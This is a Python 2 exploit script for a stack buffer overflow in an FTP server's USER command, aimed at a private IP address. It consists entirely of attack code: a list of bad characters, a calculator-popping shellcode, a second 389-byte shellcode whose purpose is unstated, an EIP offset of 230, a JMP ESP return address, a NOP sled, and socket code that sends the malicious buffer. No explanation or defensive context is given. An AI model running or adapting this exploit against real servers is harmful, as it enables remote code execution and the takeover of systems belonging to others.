import socket

target = '192.168.1.22'
port = 21

badones = '\x00\x0a\x0d'

# 220 bytes pop calc
shellcode_calc =  ""
shellcode_calc += "\xb8\x8d\x70\x59\xfa\xd9\xcc\xd9\x74\x24"
shellcode_calc += "\xf4\x5b\x31\xc9\xb1\x31\x31\x43\x13\x03"
shellcode_calc += "\x43\x13\x83\xeb\x71\x92\xac\x06\x61\xd1"
shellcode_calc += "\x4f\xf7\x71\xb6\xc6\x12\x40\xf6\xbd\x57"
shellcode_calc += "\xf2\xc6\xb6\x3a\xfe\xad\x9b\xae\x75\xc3"
shellcode_calc += "\x33\xc0\x3e\x6e\x62\xef\xbf\xc3\x56\x6e"
shellcode_calc += "\x43\x1e\x8b\x50\x7a\xd1\xde\x91\xbb\x0c"
shellcode_calc += "\x12\xc3\x14\x5a\x81\xf4\x11\x16\x1a\x7e"
shellcode_calc += "\x69\xb6\x1a\x63\x39\xb9\x0b\x32\x32\xe0"
shellcode_calc += "\x8b\xb4\x97\x98\x85\xae\xf4\xa5\x5c\x44"
shellcode_calc += "\xce\x52\x5f\x8c\x1f\x9a\xcc\xf1\x90\x69"
shellcode_calc += "\x0c\x35\x16\x92\x7b\x4f\x65\x2f\x7c\x94"
shellcode_calc += "\x14\xeb\x09\x0f\xbe\x78\xa9\xeb\x3f\xac"
shellcode_calc += "\x2c\x7f\x33\x19\x3a\x27\x57\x9c\xef\x53"
shellcode_calc += "\x63\x15\x0e\xb4\xe2\x6d\x35\x10\xaf\x36"
shellcode_calc += "\x54\x01\x15\x98\x69\x51\xf6\x45\xcc\x19"
shellcode_calc += "\x1a\x91\x7d\x40\x70\x64\xf3\xfe\x36\x66"
shellcode_calc += "\x0b\x01\x66\x0f\x3a\x8a\xe9\x48\xc3\x59"
shellcode_calc += "\x4e\xb6\x21\x48\xba\x5f\xfc\x19\x07\x02"
shellcode_calc += "\xff\xf7\x4b\x3b\x7c\xf2\x33\xb8\x9c\x77"
shellcode_calc += "\x36\x84\x1a\x6b\x4a\x95\xce\x8b\xf9\x96"
shellcode_calc += "\xda\xef\x9c\x04\x86\xc1\x3b\xad\x2d\x1e"

#389 bytes
shellcode =  ""
shellcode += "\xb8\xba\xfc\xbc\x8c\xdb\xce\xd9\x74\x24\xf4\x5d"
shellcode += "\x31\xc9\xb1\x5b\x83\xc5\x04\x31\x45\x10\x03\x45"
shellcode += "\x10\x58\x09\x40\x64\x1e\xf2\xb9\x75\x7e\x7a\x5c"
shellcode += "\x44\xbe\x18\x14\xf7\x0e\x6a\x78\xf4\xe5\x3e\x69"
shellcode += "\x8f\x8b\x96\x9e\x38\x21\xc1\x91\xb9\x19\x31\xb3"
shellcode += "\x39\x63\x66\x13\x03\xac\x7b\x52\x44\xd0\x76\x06"
shellcode += "\x1d\x9f\x25\xb7\x2a\xd5\xf5\x3c\x60\xf8\x7d\xa0"
shellcode += "\x31\xfb\xac\x77\x49\xa2\x6e\x79\x9e\xdf\x26\x61"
shellcode += "\xc3\xe5\xf1\x1a\x37\x92\x03\xcb\x09\x5b\xaf\x32"
shellcode += "\xa6\xae\xb1\x73\x01\x50\xc4\x8d\x71\xed\xdf\x49"
shellcode += "\x0b\x29\x55\x4a\xab\xba\xcd\xb6\x4d\x6f\x8b\x3d"
shellcode += "\x41\xc4\xdf\x1a\x46\xdb\x0c\x11\x72\x50\xb3\xf6"
shellcode += "\xf2\x22\x90\xd2\x5f\xf1\xb9\x43\x3a\x54\xc5\x94"
shellcode += "\xe5\x09\x63\xde\x08\x5e\x1e\xbd\x44\x93\x13\x3e"
shellcode += "\x95\xbb\x24\x4d\xa7\x64\x9f\xd9\x8b\xed\x39\x1d"
shellcode += "\x9d\xf9\xb9\xf1\x25\x69\x44\xf2\x55\xa0\x83\xa6"
shellcode += "\x05\xda\x22\xc7\xcd\x1a\xca\x12\x7b\x1b\x5c\x5d"
shellcode += "\xd4\x1a\x94\x35\x27\x1c\xb5\x04\xae\xfa\xe5\xd6"
shellcode += "\xe1\x52\x46\x87\x41\x02\x2e\xcd\x4d\x7d\x4e\xee"
shellcode += "\x87\x16\xe5\x01\x7e\x4f\x92\xb8\xdb\x1b\x03\x44"
shellcode += "\xf6\x66\x03\xce\xf3\x97\xca\x27\x71\x8b\x3b\x50"
shellcode += "\x79\x53\xbc\xf5\x79\x39\xb8\x5f\x2d\xd5\xc2\x86"
shellcode += "\x19\x7a\x3c\xed\x19\x7c\xc2\x70\x28\xf7\xf5\xe6"
shellcode += "\x14\x6f\xfa\xe6\x94\x6f\xac\x6c\x95\x07\x08\xd5"
shellcode += "\xc6\x32\x57\xc0\x7a\xef\xc2\xeb\x2a\x5c\x44\x84"
shellcode += "\xd0\xbb\xa2\x0b\x2a\xee\xb0\x4c\xd4\x6d\x9f\xf4"
shellcode += "\xbd\x8d\x9f\x04\x3e\xe7\x1f\x55\x56\xfc\x30\x5a"
shellcode += "\x96\xfd\x9a\x33\xbe\x74\x4b\xf1\x5f\x89\x46\x57"
shellcode += "\xfe\x8a\x65\x4c\xf1\xf1\x06\x73\xf2\x06\x0f\x10"
shellcode += "\xf2\x07\x2f\x26\xce\xde\x16\x5c\x11\xe3\x2c\x7f"
shellcode += "\x8c\xc9\x58\xe8\x09\x98\xe0\x75\xaa\x77\x26\x80"
shellcode += "\x29\x7d\xd7\x77\x31\xf4\xd2\x3c\xf5\xe5\xae\x2d"
shellcode += "\x90\x09\x1c\x4d\xb1"


#eip offset :  230
jmpesp='\x7b\xd0\xfc\x76'
buf = '\x41'*230 + jmpesp + '\x90'*20 + shellcode + '\x43'*(476-369)
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target,port))
resp = s.recv(1024)
print resp
s.send('USER ' + buf + '\n')

s.close()


### 0x10w1eve1 ###
